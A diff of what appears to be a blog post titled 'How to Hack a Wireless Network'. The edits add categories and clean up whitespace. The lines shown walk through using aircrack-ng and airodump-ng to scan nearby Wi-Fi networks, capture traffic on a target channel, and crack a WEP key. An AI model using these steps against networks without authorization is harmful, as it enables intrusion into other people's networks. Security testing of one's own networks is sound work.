@@ -10,6 +10,9 @@ tags:
 - WEP
 - Wi-Fi
 - WPA
+categories:
+- Linux
+- Network Security
 title: How to Hack a Wireless Network
 wordpress_id: 22
 ---
@@ -32,21 +35,21 @@ It's fairly easy to [crack](http://en.wikipedia.org/wiki/Password_cracking) a [W
 
 Install [aircrack-ng](http://www.aircrack-ng.org/) - on Debian or Ubuntu by:
 
-    
+
     sudo aptitude install aircrack-ng
 
 
 Then start aircrack-ng to look for wireless networks:
 
-    
+
     sudo airodump-ng eth1
 
 Then notice the channel number of the wireless network you want to crack.
 
     CH  1 ][ Elapsed: 9 mins ][ 2012-08-19 18:35
-     
+
     BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
-    
+
     70:71:BC:A6:FF:FF  -68      285      191    0   4  54e  WEP  WEP         wifi-0
     00:17:9A:F1:FF:FF  -77      599      104    0   6  54 . WEP  WEP         wifi-1
     4C:E6:76:C4:FF:FF  -38      926       60    0   2  54e  WPA2 CCMP   PSK  wifi-2
@@ -55,13 +58,13 @@ Then notice the channel number of the wireless network you want to crack.
 
 Quit aircrack-ng and start it again with med specific channel number to collect packages faster:
 
-    
+
     sudo airodump-ng -c 4 -w dump eth1
 
 
 Then wait and let it collect about 500K IVS and the try the do the actual crack:
 
-    
+
     sudo aircrack-ng -b 0a:0b:0c:0d:0e:0f dump-01.cap
 
 
